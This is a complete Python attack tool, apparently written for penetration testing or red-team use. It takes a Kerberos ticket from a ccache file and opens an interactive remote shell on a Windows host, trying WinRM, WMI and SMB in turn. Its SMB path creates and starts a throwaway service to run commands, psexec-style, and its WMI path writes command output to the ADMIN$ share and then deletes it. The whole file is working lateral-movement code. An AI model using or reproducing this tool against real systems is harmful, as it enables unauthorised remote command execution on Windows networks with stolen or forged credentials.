#!/usr/bin/env python3

import os
import sys
import re
import socket
import struct
import random
import string
import hashlib
import datetime
import readline
import cmd
import time
import subprocess
import base64
import http.client
import traceback
import signal
from colorama import Fore, Style, init

init(autoreset=True)

# ============================================================
# Constants
# ============================================================
OUTPUT_TIMEOUT = 15
MAX_OUTPUT_SIZE = 50000

# ============================================================
# Import WinRM Libraries (Optional)
# ============================================================
PYPSRP_AVAILABLE = False
GSSAPI_AVAILABLE = False

try:
    from pypsrp.powershell import PowerShell, RunspacePool
    from pypsrp.wsman import WSMan
    from pypsrp.exceptions import AuthenticationError, WinRMTransportError, WSManFaultError
    PYPSRP_AVAILABLE = True
except ImportError:
    pass

try:
    import gssapi
    from gssapi.creds import Credentials as GSSAPICredentials
    from gssapi.exceptions import ExpiredCredentialsError, MissingCredentialsError
    GSSAPI_AVAILABLE = True
except ImportError:
    pass


# ============================================================
# CCACHE Analysis with GSSAPI
# ============================================================
def get_credentials_from_ccache(ccache_path):
    """Extract credentials from ccache using GSSAPI"""
    if not GSSAPI_AVAILABLE:
        return None, None
    
    old_env = os.environ.get('KRB5CCNAME', '')
    os.environ['KRB5CCNAME'] = ccache_path
    
    try:
        creds = GSSAPICredentials(usage='initiate')
        if creds and creds.name:
            username = str(creds.name)
            if '@' in username:
                username_parts = username.split('@')
                realm = username_parts[1] if len(username_parts) > 1 else None
                return username_parts[0].strip(), realm
            return username.strip(), None
    except (MissingCredentialsError, ExpiredCredentialsError):
        return None, None
    except Exception:
        return None, None
    finally:
        if old_env:
            os.environ['KRB5CCNAME'] = old_env
        elif 'KRB5CCNAME' in os.environ:
            del os.environ['KRB5CCNAME']
    
    return None, None


def analyze_ccache(filepath):
    ticket_info = {
        'type': 'UNKNOWN', 'principal': '', 'realm': '', 'valid': False
    }
    
    # Try GSSAPI first
    if GSSAPI_AVAILABLE:
        old_env = os.environ.get('KRB5CCNAME', '')
        os.environ['KRB5CCNAME'] = filepath
        
        try:
            creds = GSSAPICredentials(usage='initiate')
            if creds and creds.name:
                principal = str(creds.name)
                if '@' in principal:
                    ticket_info['realm'] = principal.split('@')[1]
                    ticket_info['principal'] = principal.split('@')[0]
                else:
                    ticket_info['principal'] = principal
                ticket_info['valid'] = True
                ticket_info['type'] = 'TGS'
                return ticket_info
        except Exception:
            pass
        finally:
            if old_env:
                os.environ['KRB5CCNAME'] = old_env
            elif 'KRB5CCNAME' in os.environ:
                del os.environ['KRB5CCNAME']
    
    # Fallback to klist
    try:
        result = subprocess.run(
            ['klist', '-c', filepath],
            capture_output=True, text=True, timeout=10
        )
        output = result.stdout + result.stderr
        m = re.search(r'Default principal:\s*(\S+)', output)
        if m:
            ticket_info['principal'] = m.group(1)
            if '@' in ticket_info['principal']:
                ticket_info['realm'] = ticket_info['principal'].split('@')[1]
        if 'krbtgt/' in output or ticket_info['principal']:
            ticket_info['type'] = 'TGT'
            ticket_info['valid'] = True
        elif 'Service Principal' in output:
            ticket_info['type'] = 'TGS'
            ticket_info['valid'] = True
        elif ticket_info['principal']:
            ticket_info['type'] = 'TGT'
            ticket_info['valid'] = True
        return ticket_info
    except Exception:
        pass
    
    ticket_info['valid'] = True
    return ticket_info


# ============================================================
# Network Utilities
# ============================================================
def check_port(ip, port, timeout=5):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        result = sock.connect_ex((ip, port))
        sock.close()
        return result == 0
    except Exception:
        return False


# ============================================================
# Ticket Verification
# ============================================================
def verify_ticket(target_hostname, ccache_path):
    print(Fore.YELLOW + "\n[*] Verifying ticket validity against target..." + Style.RESET_ALL)
    
    old_env = os.environ.get('KRB5CCNAME', '')
    os.environ['KRB5CCNAME'] = ccache_path
    
    try:
        result = subprocess.run(
            ['klist', '-s'],
            capture_output=True,
            timeout=5
        )
        
        if result.returncode == 0:
            print(Fore.CYAN + "    [*] Ticket is valid" + Style.RESET_ALL)
            return True
        else:
            error_output = result.stderr.decode() if result.stderr else 'Unknown error'
            print(Fore.RED + f"    [-] Ticket is invalid: {error_output}" + Style.RESET_ALL)
            return False
    except Exception as e:
        print(Fore.YELLOW + f"    [*] Verification warning: {e}" + Style.RESET_ALL)
        return True
    finally:
        if old_env:
            os.environ['KRB5CCNAME'] = old_env
        elif 'KRB5CCNAME' in os.environ:
            del os.environ['KRB5CCNAME']


# ============================================================
# WinRM Execution Engine (Fixed with pypsrp)
# ============================================================
class WinRMExecutor:
    def __init__(self, ip, username, domain, hostname, ccache_path):
        self.ip = ip
        self.username = username
        self.domain = domain
        self.hostname = hostname
        self.ccache_path = ccache_path
        self.pwd = 'C:\\'
        self.r_pool = None
        self.wsman = None
        self._connected = False
    
    def _cleanup(self):
        if self.r_pool:
            try:
                self.r_pool.close()
            except:
                pass
            self.r_pool = None
        if self.wsman:
            try:
                self.wsman.close()
            except:
                pass
            self.wsman = None
    
    def _reconnect_if_needed(self):
        if not self._connected:
            return False
        if not self.r_pool:
            return False
        try:
            ps = PowerShell(self.r_pool)
            ps.add_cmdlet('Invoke-Expression').add_parameter('Command', '$true')
            ps.invoke()
            if ps.output and len(ps.output) > 0:
                return True
        except Exception:
            pass
        print(Fore.YELLOW + "\n[*] Connection lost, attempting to reconnect..." + Style.RESET_ALL)
        return self.connect()
    
    def connect(self):
        if not PYPSRP_AVAILABLE:
            print(Fore.YELLOW + "    [*] pypsrp not available, falling back to manual WinRM" + Style.RESET_ALL)
            return self._connect_manual()
        
        if not check_port(self.hostname, 5985):
            print(Fore.YELLOW + "    [*] Port 5985 closed" + Style.RESET_ALL)
            return False
        
        print(Fore.YELLOW + "    [*] Setting up Kerberos authentication (pypsrp)..." + Style.RESET_ALL)
        
        os.environ['KRB5CCNAME'] = self.ccache_path
        
        if not self.username:
            user, realm = get_credentials_from_ccache(self.ccache_path)
            if user:
                self.username = user
                print(Fore.CYAN + f"    [*] Using username from ccache: {self.username}" + Style.RESET_ALL)
        
        spn_list = [f"HTTP/{self.hostname}", f"WSMAN/{self.hostname}"]
        if self.domain:
            spn_list.extend([f"HTTP/{self.hostname}.{self.domain}", f"WSMAN/{self.hostname}.{self.domain}"])
        
        for spn in spn_list:
            try:
                self.wsman = WSMan(
                    server=self.hostname,
                    port=5985,
                    auth='kerberos',
                    ssl=False,
                    cert_validation=False,
                    path='wsman',
                    connection_timeout=30,
                    read_timeout=60,
                    negotiate_hostname_override=self.hostname,
                    negotiate_service=spn.split('/')[0] if '/' in spn else "HTTP"
                )
                
                self.r_pool = RunspacePool(self.wsman)
                self.r_pool.open()
                
                ps = PowerShell(self.r_pool)
                ps.add_cmdlet('Invoke-Expression').add_parameter('Command', 'whoami')
                ps.add_cmdlet('Out-String').add_parameter('Stream')
                ps.invoke()
                
                if ps.output and len(ps.output) > 0:
                    output = '\n'.join(str(line) for line in ps.output if line).strip()
                    if output:
                        self._connected = True
                        print(Fore.GREEN + f"    [+] WinRM authentication successful! User: {output}" + Style.RESET_ALL)
                        
                        pwd_ps = PowerShell(self.r_pool)
                        pwd_ps.add_cmdlet('Invoke-Expression').add_parameter('Command', '$pwd.Path')
                        pwd_ps.invoke()
                        if pwd_ps.output:
                            self.pwd = str(pwd_ps.output[0]).strip()
                        return True
                
                self._cleanup()
            except Exception as e:
                self._cleanup()
                continue
        
        print(Fore.YELLOW + "    [*] pypsrp failed, falling back to manual WinRM" + Style.RESET_ALL)
        return self._connect_manual()
    
    def _connect_manual(self):
        """Fallback to manual SOAP-based WinRM"""
        try:
            if not check_port(self.ip, 5985):
                return False
            
            conn = http.client.HTTPConnection(self.ip, 5985, timeout=10)
            conn.request("GET", "/wsman")
            resp = conn.getresponse()
            resp.read()
            conn.close()
            
            if resp.status not in [200, 401, 405]:
                return False
            
            os.environ['KRB5CCNAME'] = self.ccache_path
            self._connected = True
            self._authenticated = True
            self._use_manual = True
            self.shell_id = None
            print(Fore.GREEN + "    [+] WinRM (manual) ready" + Style.RESET_ALL)
            return True
        except Exception as e:
            print(Fore.RED + f"    [-] WinRM connection error: {e}" + Style.RESET_ALL)
            return False
    
    def _create_shell_manual(self):
        if hasattr(self, '_use_manual') and self._use_manual:
            if self.shell_id:
                return True
            
            shell_id = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
            soap = f'''<?xml version="1.0"?>
<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope"
            xmlns:wsa="http://schemas.xmlsoap.org/ws/2004/08/addressing"
            xmlns:wsman="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd"
            xmlns:p="http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd">
  <s:Header>
    <wsa:To>http://{self.ip}:5985/wsman</wsa:To>
    <wsman:ResourceURI>http://schemas.microsoft.com/wbem/wsman/1/windows/shell/cmd</wsman:ResourceURI>
    <wsa:MessageID>uuid:{shell_id}</wsa:MessageID>
    <wsa:Action>http://schemas.xmlsoap.org/ws/2004/09/transfer/Create</wsa:Action>
    <wsman:OptionSet>
      <wsman:Option Name="WINRS_NOPROFILE">FALSE</wsman:Option>
      <wsman:Option Name="WINRS_CODEPAGE">437</wsman:Option>
    </wsman:OptionSet>
  </s:Header>
  <s:Body>
    <p:Shell>
      <p:ShellId>{shell_id}</p:ShellId>
      <p:WorkingDirectory>{self.pwd}</p:WorkingDirectory>
    </p:Shell>
  </s:Body>
</s:Envelope>'''
            try:
                conn = http.client.HTTPConnection(self.ip, 5985, timeout=30)
                headers = {"Content-Type": "application/soap+xml;charset=UTF-8", "Authorization": "Negotiate"}
                conn.request("POST", "/wsman", body=soap, headers=headers)
                resp = conn.getresponse()
                response_data = resp.read().decode('utf-8', errors='ignore')
                conn.close()
                
                match = re.search(r'<p:ShellId>(.*?)</p:ShellId>', response_data)
                if match:
                    self.shell_id = match.group(1)
                    return True
            except Exception:
                pass
        return False
    
    def run_ps_command(self, command):
        if not self._connected:
            return "Not connected"
        
        if hasattr(self, '_use_manual') and self._use_manual:
            return self._execute_manual(command)
        
        if not self.r_pool:
            if not self._reconnect_if_needed():
                return "Connection lost"
        
        try:
            ps = PowerShell(self.r_pool)
            ps.add_cmdlet('Invoke-Expression').add_parameter('Command', command)
            ps.add_cmdlet('Out-String').add_parameter('Stream')
            ps.invoke()
            
            output = []
            if ps.output:
                for line in ps.output:
                    if line and str(line).strip():
                        output.append(str(line).strip())
            return '\n'.join(output) if output else ""
        except Exception as e:
            return f"Error: {e}"
    
    def _execute_manual(self, command):
        if not self.shell_id:
            if not self._create_shell_manual():
                return "Failed to create shell"
        
        try:
            command_id = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
            soap = f'''<?xml version="1.0"?>
<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope"
            xmlns:wsa="http://schemas.xmlsoap.org/ws/2004/08/addressing"
            xmlns:wsman="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd"
            xmlns:p="http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd">
  <s:Header>
    <wsa:To>http://{self.ip}:5985/wsman</wsa:To>
    <wsman:ResourceURI>http://schemas.microsoft.com/wbem/wsman/1/windows/shell/cmd</wsman:ResourceURI>
    <wsa:MessageID>uuid:{command_id}</wsa:MessageID>
    <wsa:Action>http://schemas.microsoft.com/wbem/wsman/1/windows/shell/Command</wsa:Action>
    <wsman:SelectorSet>
      <wsman:Selector Name="ShellId">{self.shell_id}</wsman:Selector>
    </wsman:SelectorSet>
  </s:Header>
  <s:Body>
    <p:CommandLine>
      <p:Command>{command.replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;').replace('"', '&quot;')}</p:Command>
    </p:CommandLine>
  </s:Body>
</s:Envelope>'''
            conn = http.client.HTTPConnection(self.ip, 5985, timeout=60)
            headers = {"Content-Type": "application/soap+xml;charset=UTF-8", "Authorization": "Negotiate"}
            conn.request("POST", "/wsman", body=soap, headers=headers)
            resp = conn.getresponse()
            response_data = resp.read().decode('utf-8', errors='ignore')
            conn.close()
            
            output = ""
            stdout_matches = re.findall(r'<p:StdOut>(.*?)</p:StdOut>', response_data, re.DOTALL)
            for match in stdout_matches:
                try:
                    output += base64.b64decode(match.encode()).decode('utf-8', errors='replace')
                except:
                    output += match
            return output.strip()
        except Exception as e:
            return f"Error: {e}"
    
    def execute(self, command, get_output=True):
        if not self._connected:
            return False, "Not connected"
        
        try:
            if command.lower().startswith('cd '):
                new_path = command[3:].strip()
                if new_path:
                    if new_path.startswith('"') and new_path.endswith('"'):
                        new_path = new_path[1:-1]
                    self.pwd = new_path
                return True, self.pwd
            
            if command.lower() == 'cd':
                return True, self.pwd
            
            ps_command = f'cd "{self.pwd}" 2>$null; {command} 2>&1 | Out-String'
            output = self.run_ps_command(ps_command)
            
            if len(output) > MAX_OUTPUT_SIZE:
                output = output[:MAX_OUTPUT_SIZE] + "\n[... output truncated ...]"
            
            return True, output if output else "Command executed"
        except Exception as e:
            return False, str(e)
    
    def close(self):
        self._cleanup()
        self._connected = False


# ============================================================
# WMI Execution Engine
# ============================================================
class WMIExecutor:
    def __init__(self, ip, username, domain, hostname):
        self.ip = ip
        self.username = username
        self.domain = domain
        self.hostname = hostname
        self.conn = None
        self.dcom = None
        self.win32Process = None
        self.share = 'ADMIN$'
        self.output_file = f'__{int(time.time())}_{random.randint(1000, 9999)}'
        self.pwd = 'C:\\'
    
    def connect(self):
        try:
            from impacket.smbconnection import SMBConnection
            from impacket.dcerpc.v5.dcomrt import DCOMConnection
            from impacket.dcerpc.v5.dcom import wmi
            from impacket.dcerpc.v5.dtypes import NULL
            
            self.conn = SMBConnection(self.hostname, self.ip)
            self.conn.kerberosLogin(self.username, self.domain, '', '', kdcHost=self.hostname)
            self.conn.setTimeout(100000)
            
            self.dcom = DCOMConnection(
                self.hostname, self.username, '',
                self.domain, '', '',
                None, oxidResolver=True,
                doKerberos=True, kdcHost=self.hostname,
                remoteHost=self.ip
            )
            
            iInterface = self.dcom.CoCreateInstanceEx(wmi.CLSID_WbemLevel1Login, wmi.IID_IWbemLevel1Login)
            iWbemLevel1Login = wmi.IWbemLevel1Login(iInterface)
            iWbemServices = iWbemLevel1Login.NTLMLogin('//./root/cimv2', NULL, NULL)
            iWbemLevel1Login.RemRelease()
            
            self.win32Process, _ = iWbemServices.GetObject('Win32_Process')
            return True
        except Exception:
            return False
    
    def execute(self, command, get_output=True):
        try:
            if command.lower().startswith('cd ') or command.lower() == 'cd':
                full_command = f'cmd.exe /Q /c cd /d {self.pwd} && {command} && cd'
            else:
                full_command = f'cmd.exe /Q /c cd /d {self.pwd} && {command}'
            
            if get_output:
                full_command += f' 1> \\\\127.0.0.1\\{self.share}\\{self.output_file} 2>&1'
            
            response = self.win32Process.Create(full_command, self.pwd, None)
            
            if not get_output:
                return True, "Command executed"
            
            output = self._wait_for_output()
            
            if command.lower().startswith('cd ') or command.lower() == 'cd':
                lines = output.strip().split('\n')
                for line in lines:
                    line = line.strip()
                    if ':\\' in line and not line.startswith('>') and not line.startswith('*'):
                        self.pwd = line
                        break
            
            return True, output
        except Exception as e:
            return False, str(e)
    
    def _wait_for_output(self):
        output_buffer = ""
        def output_callback(data):
            nonlocal output_buffer
            try:
                output_buffer += data.decode('utf-8', errors='replace')
            except:
                output_buffer += str(data)
        
        for attempt in range(OUTPUT_TIMEOUT):
            try:
                self.conn.getFile(self.share, self.output_file, output_callback)
                break
            except Exception:
                time.sleep(1)
        
        try:
            self.conn.deleteFile(self.share, self.output_file)
        except Exception:
            pass
        
        if len(output_buffer) > MAX_OUTPUT_SIZE:
            output_buffer = output_buffer[:MAX_OUTPUT_SIZE] + "\n[... output truncated ...]"
        return output_buffer.strip()
    
    def close(self):
        try:
            if self.dcom:
                self.dcom.disconnect()
        except:
            pass
        try:
            if self.conn:
                self.conn.logoff()
        except:
            pass


# ============================================================
# SMB Execution Engine
# ============================================================
class SMBExecutor:
    def __init__(self, ip, username, domain, hostname):
        self.ip = ip
        self.username = username
        self.domain = domain
        self.hostname = hostname
        self.conn = None
        self.dce = None
        self.pwd = 'C:\\'
    
    def connect(self):
        try:
            from impacket.smbconnection import SMBConnection
            from impacket.dcerpc.v5 import transport, scmr
            
            self.conn = SMBConnection(self.hostname, self.ip)
            self.conn.kerberosLogin(self.username, self.domain, '', '', kdcHost=self.hostname)
            
            rpctransport = transport.SMBTransport(self.hostname, 445, r'\svcctl', self.conn)
            self.dce = rpctransport.get_dce_rpc()
            self.dce.connect()
            self.dce.bind(scmr.MSRPC_UUID_SCMR)
            return True
        except Exception:
            return False
    
    def execute(self, command, get_output=True):
        try:
            from impacket.dcerpc.v5 import scmr
            
            service_name = 'R' + ''.join(random.choices(string.ascii_uppercase, k=6))
            remote_file = f'Windows\\Temp\\{service_name}.txt'
            local_file = f'/tmp/{service_name}.txt'
            
            if command.lower().startswith('cd ') or command.lower() == 'cd':
                full_cmd = f'cmd.exe /Q /c "cd /d {self.pwd} && {command} && cd > C:\\Windows\\Temp\\{service_name}.txt 2>&1"'
            else:
                full_cmd = f'cmd.exe /Q /c "cd /d {self.pwd} && {command} > C:\\Windows\\Temp\\{service_name}.txt 2>&1"'
            
            resp = scmr.hRCreateServiceW(self.dce, self.conn.getServerName(),
                service_name, service_name, full_cmd,
                scmr.SERVICE_WIN32_OWN_PROCESS,
                scmr.SERVICE_DEMAND_START,
                scmr.SERVICE_ERROR_IGNORE)
            handle = resp['lpServiceHandle']
            
            try:
                scmr.hRStartServiceW(self.dce, handle)
            except:
                pass
            
            output = ""
            for attempt in range(OUTPUT_TIMEOUT):
                try:
                    with open(local_file, 'wb') as f:
                        self.conn.getFile('C$', remote_file, f.write)
                    if os.path.getsize(local_file) > 0:
                        with open(local_file, 'r', errors='replace') as f:
                            output = f.read()
                        break
                except:
                    time.sleep(1)
            
            try:
                os.remove(local_file)
            except:
                pass
            try:
                self.conn.deleteFile('C$', remote_file)
            except:
                pass
            try:
                scmr.hRDeleteService(self.dce, handle)
            except:
                pass
            
            if command.lower().startswith('cd ') or command.lower() == 'cd':
                lines = output.strip().split('\n')
                for line in lines:
                    line = line.strip()
                    if ':\\' in line:
                        self.pwd = line
                        break
            
            if len(output) > MAX_OUTPUT_SIZE:
                output = output[:MAX_OUTPUT_SIZE] + "\n[... output truncated ...]"
            
            return True, output.strip() if output.strip() else "Command executed"
        except Exception as e:
            return False, str(e)
    
    def close(self):
        try:
            if self.dce:
                self.dce.disconnect()
        except:
            pass
        try:
            if self.conn:
                self.conn.logoff()
        except:
            pass


# ============================================================
# Service Auto-Detector
# ============================================================
class ServiceDetector:
    def __init__(self, ip, username, domain, hostname, ccache_path):
        self.ip = ip
        self.username = username
        self.domain = domain
        self.hostname = hostname
        self.ccache_path = ccache_path
    
    def try_wmi(self):
        print(Fore.YELLOW + "[*] Trying WMI (port 135)..." + Style.RESET_ALL)
        if not check_port(self.ip, 135):
            print(Fore.RED + "    [-] Port 135 closed" + Style.RESET_ALL)
            return None
        
        executor = WMIExecutor(self.ip, self.username, self.domain, self.hostname)
        if executor.connect():
            print(Fore.GREEN + "    [+] WMI authentication successful!" + Style.RESET_ALL)
            return ("WMI", executor)
        executor.close()
        print(Fore.RED + "    [-] WMI authentication failed (may require admin)" + Style.RESET_ALL)
        return None
    
    def try_winrm(self):
        print(Fore.YELLOW + "[*] Trying WinRM (port 5985)..." + Style.RESET_ALL)
        executor = WinRMExecutor(self.ip, self.username, self.domain, self.hostname, self.ccache_path)
        if executor.connect():
            print(Fore.GREEN + "    [+] WinRM authentication successful!" + Style.RESET_ALL)
            return ("WinRM", executor)
        print(Fore.RED + "    [-] WinRM not available or authentication failed" + Style.RESET_ALL)
        return None
    
    def try_smb(self):
        print(Fore.YELLOW + "[*] Trying SMB (port 445)..." + Style.RESET_ALL)
        if not check_port(self.ip, 445):
            print(Fore.RED + "    [-] Port 445 closed" + Style.RESET_ALL)
            return None
        
        executor = SMBExecutor(self.ip, self.username, self.domain, self.hostname)
        if executor.connect():
            print(Fore.GREEN + "    [+] SMB authentication successful!" + Style.RESET_ALL)
            return ("SMB", executor)
        executor.close()
        print(Fore.RED + "    [-] SMB authentication failed (may require admin)" + Style.RESET_ALL)
        return None
    
    def auto_detect(self):
        print(Fore.CYAN + "\n    Priority: WinRM > WMI > SMB" + Style.RESET_ALL)
        methods = [self.try_winrm, self.try_wmi, self.try_smb]
        for method in methods:
            result = method()
            if result:
                return result
        return None


# ============================================================
# Interactive Shell
# ============================================================
class InteractiveShell(cmd.Cmd):
    def __init__(self, target_ip, username, domain, ccache_path, ticket_info, hostname_domain, service_type, executor):
        super().__init__()
        self.target_ip = target_ip
        self.hostname = hostname_domain
        self.username = username
        self.domain = domain
        self.ccache_path = ccache_path
        self.ticket_info = ticket_info
        self.service_type = service_type
        self.executor = executor
        self.update_prompt()
        
        self.intro = Fore.CYAN + f"""
╔═══════════════════════════════════════════════════════════╗
║           Kerberos Shell - {service_type:<8s} Real Execution           ║
╠═══════════════════════════════════════════════════════════╣
║  Target   : {target_ip:<43s}╣
║  Hostname : {hostname_domain:<43s}╣
║  User     : {username:<43s}╣
║  Domain   : {domain:<43s}╣
║  Service  : {service_type:<43s}╣
║  Ticket   : {ticket_info['type']:<43s}╣
╚═══════════════════════════════════════════════════════════╝
Type commands, 'help' for help, 'exit' to quit
""" + Style.RESET_ALL
    
    def update_prompt(self):
        pwd = getattr(self.executor, 'pwd', 'C:\\')
        self.prompt = Fore.GREEN + f"{self.username}@{self.target_ip} {pwd}> " + Style.RESET_ALL
    
    def preloop(self):
        os.environ['KRB5CCNAME'] = self.ccache_path
        print(Fore.GREEN + f"[+] Shell ready via {self.service_type}!" + Style.RESET_ALL)
    
    def default(self, line):
        if not line.strip():
            return
        if line.startswith('!'):
            os.system(line[1:])
            return
        if line.lower() in ['cls', 'clear']:
            os.system('clear')
            return
        
        success, output = self.executor.execute(line)
        if success:
            if output:
                print(output)
            if line.lower().startswith('cd ') or line.lower() == 'cd':
                self.update_prompt()
        else:
            print(Fore.RED + f"[-] Error: {output}" + Style.RESET_ALL)
    
    def do_cd(self, arg):
        if not arg:
            print(getattr(self.executor, 'pwd', 'C:\\'))
            return
        success, output = self.executor.execute(f'cd "{arg}"')
        if success:
            self.update_prompt()
        else:
            print(Fore.RED + f"[-] Failed to change directory: {output}" + Style.RESET_ALL)
    
    def do_exit(self, arg):
        print(Fore.YELLOW + "[*] Closing connection..." + Style.RESET_ALL)
        if self.executor:
            self.executor.close()
        return True
    
    def do_quit(self, arg):
        return self.do_exit(arg)
    
    def do_pwd(self, arg):
        print(getattr(self.executor, 'pwd', 'C:\\'))
    
    def do_whoami(self, arg):
        self.default('whoami')
    
    def do_hostname(self, arg):
        self.default('hostname')
    
    def do_ipconfig(self, arg):
        self.default('ipconfig')
    
    def do_dir(self, arg):
        self.default(f'dir {arg}' if arg else 'dir')
    
    def do_ls(self, arg):
        self.do_dir(arg)
    
    def do_help(self, arg):
        print(Fore.CYAN + """
  Built-in Commands:
    cd <path>   - Change working directory
    pwd         - Print current working directory
    whoami      - Show current user
    hostname    - Show remote hostname
    ipconfig    - Show network config
    dir/ls      - List directory contents
    cls/clear   - Clear screen
    !<command>  - Execute on local machine
    exit/quit   - Close shell
    help        - Show this help
""" + Style.RESET_ALL)
    
    def emptyline(self):
        pass
    
    def postloop(self):
        if self.executor:
            self.executor.close()


# ============================================================
# Utilities
# ============================================================
def banner():
    print(Fore.CYAN + """
    ╔═══════════════════════════════════════════════════════════╗
    ║       Kerberos Shell - Multi-Service Real Execution       ║
    ║              WMI + WinRM + SMB                            ║
    ╚═══════════════════════════════════════════════════════════╝
    """ + Style.RESET_ALL)

def exit_handler(sig=None, frame=None):
    print(Fore.YELLOW + "\n[!] Exiting..." + Style.RESET_ALL)
    sys.exit(0)

signal.signal(signal.SIGINT, exit_handler)

def validate_ip(ip):
    pattern = r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$'
    return bool(re.match(pattern, ip)) and all(0 <= int(p) <= 255 for p in ip.split('.'))

def validate_hostname_domain(hostname):
    return bool(re.match(r'^[a-zA-Z0-9].*\.[a-zA-Z]{2,}$', hostname))

def get_input(prompt, validator=None):
    while True:
        try:
            value = input(prompt).strip()
            if not value:
                print(Fore.RED + "[!] Cannot be empty!" + Style.RESET_ALL)
                continue
            if validator and not validator(value):
                print(Fore.RED + "[!] Invalid format!" + Style.RESET_ALL)
                continue
            return value
        except (KeyboardInterrupt, EOFError):
            exit_handler()

def resolve_path(path_input):
    path_input = os.path.expanduser(path_input)
    if os.path.exists(path_input) and os.path.isfile(path_input):
        return os.path.abspath(path_input)
    cwd_path = os.path.join(os.getcwd(), path_input)
    if os.path.exists(cwd_path) and os.path.isfile(cwd_path):
        return os.path.abspath(cwd_path)
    return None


# ============================================================
# Main
# ============================================================
def main():
    banner()
    
    print(Fore.YELLOW + "[Step 1] Target Configuration" + Style.RESET_ALL)
    dc_ip = get_input(Fore.CYAN + "[?] Target IP: " + Style.RESET_ALL, validate_ip)
    hostname_domain = get_input(Fore.CYAN + "[?] Hostname.Domain (FQDN): " + Style.RESET_ALL, validate_hostname_domain)
    
    parts = hostname_domain.split('.', 1)
    domain = parts[1] if len(parts) > 1 else ''
    
    try:
        with open('/etc/hosts', 'r') as f:
            if dc_ip not in f.read():
                print(Fore.YELLOW + f"\n[!] Add to /etc/hosts:" + Style.RESET_ALL)
                print(Fore.GREEN + f"    sudo echo '{dc_ip}\t{hostname_domain}' >> /etc/hosts" + Style.RESET_ALL)
    except:
        pass
    
    print(Fore.YELLOW + "\n[Step 2] User Information" + Style.RESET_ALL)
    username = get_input(Fore.CYAN + "[?] Username: " + Style.RESET_ALL)
    
    print(Fore.YELLOW + "\n[Step 3] Kerberos Ticket" + Style.RESET_ALL)
    while True:
        ccache_input = get_input(Fore.CYAN + "[?] CCache path: " + Style.RESET_ALL)
        ccache_path = resolve_path(ccache_input)
        if ccache_path:
            print(Fore.GREEN + f"[+] Found: {ccache_path}" + Style.RESET_ALL)
            break
        print(Fore.RED + "[!] File not found!" + Style.RESET_ALL)
    
    print(Fore.YELLOW + "\n[Step 4] Analyzing Ticket..." + Style.RESET_ALL)
    ticket_info = analyze_ccache(ccache_path)
    print(Fore.GREEN + f"[+] Type: {ticket_info['type']}" + Style.RESET_ALL)
    if ticket_info['principal']:
        print(Fore.GREEN + f"[+] Principal: {ticket_info['principal']}" + Style.RESET_ALL)
    if ticket_info['realm']:
        print(Fore.GREEN + f"[+] Realm: {ticket_info['realm']}" + Style.RESET_ALL)
    
    if not verify_ticket(hostname_domain, ccache_path):
        print(Fore.RED + "\n[!] Ticket verification failed. Aborting." + Style.RESET_ALL)
        sys.exit(1)
    
    print(Fore.YELLOW + "\n[Step 5] Setting Kerberos Environment..." + Style.RESET_ALL)
    os.environ['KRB5CCNAME'] = ccache_path
    print(Fore.GREEN + f"[+] KRB5CCNAME = {ccache_path}" + Style.RESET_ALL)
    
    print(Fore.YELLOW + "\n[Step 6] Auto-Detecting Best Service..." + Style.RESET_ALL)
    detector = ServiceDetector(dc_ip, username, domain, hostname_domain, ccache_path)
    result = detector.auto_detect()
    
    if not result:
        print(Fore.RED + "\n[-] All services failed!" + Style.RESET_ALL)
        print(Fore.YELLOW + "[*] Check:" + Style.RESET_ALL)
        print(Fore.WHITE + "    1. User has appropriate privileges" + Style.RESET_ALL)
        print(Fore.WHITE + "    2. Kerberos ticket is valid" + Style.RESET_ALL)
        print(Fore.WHITE + "    3. Firewall allows WMI/WinRM/SMB" + Style.RESET_ALL)
        print(Fore.WHITE + "    4. Run: pip install pypsrp gssapi" + Style.RESET_ALL)
        sys.exit(1)
    
    service_type, executor = result
    print(Fore.GREEN + f"\n[+] Launching {service_type} shell..." + Style.RESET_ALL)
    
    try:
        shell = InteractiveShell(dc_ip, username, domain, ccache_path, ticket_info, hostname_domain, service_type, executor)
        shell.cmdloop()
    except KeyboardInterrupt:
        print(Fore.YELLOW + "\n[*] Shell closed." + Style.RESET_ALL)
    except Exception as e:
        print(Fore.RED + f"\n[!] Shell error: {e}" + Style.RESET_ALL)
        traceback.print_exc()
    finally:
        if executor:
            executor.close()


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        exit_handler()
    except Exception as e:
        print(Fore.RED + f"\n[!] Fatal error: {e}" + Style.RESET_ALL)
        traceback.print_exc()
        sys.exit(1)
